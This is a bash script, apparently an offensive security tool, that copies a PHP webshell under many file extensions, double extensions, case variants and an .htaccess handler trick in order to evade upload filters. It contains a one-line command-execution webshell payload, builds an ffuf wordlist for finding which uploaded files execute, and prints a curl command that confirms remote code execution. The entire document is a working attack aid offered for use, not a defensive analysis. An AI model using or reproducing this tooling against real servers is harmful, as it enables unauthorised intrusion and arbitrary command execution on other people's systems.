#!/usr/bin/env bash
# ==============================================================================
# webshell-ext.sh  v1.0.0
# Clone a webshell payload across PHP/CGI upload-filter bypass extensions.
#
# Blocked on .php? Servers often still EXECUTE .phtml/.phar/.php5/.shtml/.cgi.
# This stamps your payload into every variant, plus optional double-extension
# and case bypasses, and writes a filename wordlist to fuzz which ones run.
#
# Usage:
#   ./webshell-ext.sh [payload] [-o dir] [-b] [-w] [-u URL]
#     payload      source file (default: shell.php)
#     -o dir       output directory (default: ./shells)
#     -b           also generate bypass variants (double-ext, case, trailing dot)
#     -w           write shells.txt (bare filenames, for ffuf/feroxbuster)
#     -u URL       print ready-to-run ffuf line against URL/FUZZ
#
# Examples:
#   ./webshell-ext.sh shell.php
#   ./webshell-ext.sh cmd.php -o payloads -b -w
#   ./webshell-ext.sh shell.php -w -u http://$ip/uploads
# ==============================================================================

set -euo pipefail

# --- primary extensions (execute as PHP/CGI on many stacks) -------------------
EXTS=(php php3 php4 php5 php7 phtml phar shtml cgi)
# a few extras worth trying — comment out any your target won't run:
EXTS+=(pht phps)

# --- defaults -----------------------------------------------------------------
SRC="shell.php"
OUT="./shells"
BYPASS=0
WORDLIST=0
URL=""

# --- colours ------------------------------------------------------------------
if [[ -t 1 ]]; then G="\033[32m"; Y="\033[33m"; C="\033[36m"; R="\033[31m"; N="\033[0m"; else G= Y= C= R= N=; fi

# --- arg parse ----------------------------------------------------------------
POS=()
while [[ $# -gt 0 ]]; do
  case "$1" in
    -o) OUT="$2"; shift 2;;
    -b) BYPASS=1; shift;;
    -w) WORDLIST=1; shift;;
    -u) URL="$2"; shift 2;;
    -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
    -*) echo -e "${R}unknown flag: $1${N}"; exit 1;;
    *)  POS+=("$1"); shift;;
  esac
done
[[ ${#POS[@]} -ge 1 ]] && SRC="${POS[0]}"

# --- checks -------------------------------------------------------------------
if [[ ! -f "$SRC" ]]; then
  echo -e "${R}[!] payload not found: $SRC${N}"
  echo -e "    make one first, e.g.:  echo '<?php system(\$_GET[\"c\"]); ?>' > shell.php"
  exit 1
fi

BASE="$(basename "$SRC")"     # shell.php
STEM="${BASE%.*}"             # shell
mkdir -p "$OUT"

echo -e "${C}=== webshell-ext v1.0.0 ===${N}"
echo -e "[*] payload : ${SRC}"
echo -e "[*] stem    : ${STEM}"
echo -e "[*] outdir  : ${OUT}"
echo

count=0
declare -a NAMES=()

emit() {  # emit <filename>
  cp "$SRC" "$OUT/$1"
  NAMES+=("$1")
  echo -e "    ${G}+${N} $1"
  count=$((count+1))
}

# --- primary extension clones -------------------------------------------------
echo -e "${Y}[+] primary extensions${N}"
for e in "${EXTS[@]}"; do
  emit "${STEM}.${e}"
done

# --- bypass variants ----------------------------------------------------------
if [[ $BYPASS -eq 1 ]]; then
  echo -e "${Y}[+] bypass variants (double-ext / case / trailing)${N}"
  # double extension — image ext first, php-ish last (Apache mis-mapping)
  for e in php phtml phar; do
    for img in jpg jpeg png gif; do
      emit "${STEM}.${img}.${e}"     # shell.jpg.php  (last ext wins on many stacks)
    done
  done
  # php-first double ext (mod_mime / AddHandler misconfig executes first .php)
  emit "${STEM}.php.jpg"
  emit "${STEM}.php.png"
  # case-mangling (case-insensitive filter, case-sensitive handler)
  emit "${STEM}.pHp"
  emit "${STEM}.PHP"
  emit "${STEM}.Php5"
  emit "${STEM}.phTML"
  # trailing dot / space (Windows/Apache strip on save, blacklist misses)
  emit "${STEM}.php."
  # htaccess helper — drop this too, then any ext you upload runs as php
  printf 'AddType application/x-httpd-php .%s\n' "${STEM}xx" > "$OUT/.htaccess" 2>/dev/null || true
  echo -e "    ${G}+${N} .htaccess (AddType helper — upload alongside, then use .${STEM}xx)"
fi

# --- wordlist -----------------------------------------------------------------
if [[ $WORDLIST -eq 1 ]]; then
  printf '%s\n' "${NAMES[@]}" > "$OUT/shells.txt"
  echo
  echo -e "${C}[*] wrote ${OUT}/shells.txt (${#NAMES[@]} names)${N}"
fi

echo
echo -e "${C}[+] ${count} payloads written to ${OUT}/${N}"

# --- ffuf helper --------------------------------------------------------------
if [[ -n "$URL" ]]; then
  echo
  echo -e "${Y}[>] find which ones the server executes:${N}"
  echo    "    # 1) upload every file in ${OUT}/ (via the app's upload form / Burp Intruder / curl loop)"
  echo    "    # 2) then fuzz which landed AND execute:"
  echo -e "    ${G}ffuf -u ${URL}/FUZZ -w ${OUT}/shells.txt -mc 200 -fs 0${N}"
  echo    "    # a NON-zero size on a .phtml/.phar etc = it rendered = code execution path"
  echo    "    # confirm RCE:  curl '${URL}/${STEM}.phtml?c=id'"
fi
